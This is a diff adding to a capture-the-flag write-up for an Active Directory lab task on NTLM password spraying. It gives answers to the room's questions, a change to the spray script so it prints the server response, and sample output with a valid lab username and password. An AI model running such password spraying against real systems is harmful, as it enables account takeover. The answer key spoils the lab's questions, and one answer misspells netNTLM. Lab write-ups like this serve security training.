@@ -269,4 +269,52 @@ root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# python ntlm_passwordspray.py -u u
 [*] Password spray attack completed, 4 valid credential pairs found
 root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# 
 ~~~
+```
+### Q1 Task 3: What is the name of the challenge-response authentication mechanism that uses NTLM? 
 
+Answer: netNTML
+
+### Q2 Task 3: What is the username of the third valid credential pair found by the password spraying script? 
+
+Answer: Gorden.stevens
+
+### Q3 Task 3: How many valid credentials pairs were found by the password spraying script? Answer 4
+
+### Q4 Task 3: What is the message displayed by the web application when authenticating with a valid credential pair? Answer 'Hello World'
+
+How to Modify the Script to Print the Success Message
+Inside this block:
+
+```
+if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+    print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+    count += 1
+    continue
+```    
+Add: (all with spaces no tabs, even if aligns causes issues with python)
+
+```
+print(response.text)
+✅ Final Modified Code Block (only the changed part)
+python
+if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+    print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+    print (response.text)   # <-- This prints the message shown by the web app
+    count += 1
+    continue
+```
+Example of output with our answer of message from response.text
+```
+...
+[-] Failed login with Username: jennifer.wood
+[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
+<html>
+<head>
+</head>
+<body>
+Hello World
+</body>
+</html>
+[-] Failed login with Username: louise.talbot
+...
+```
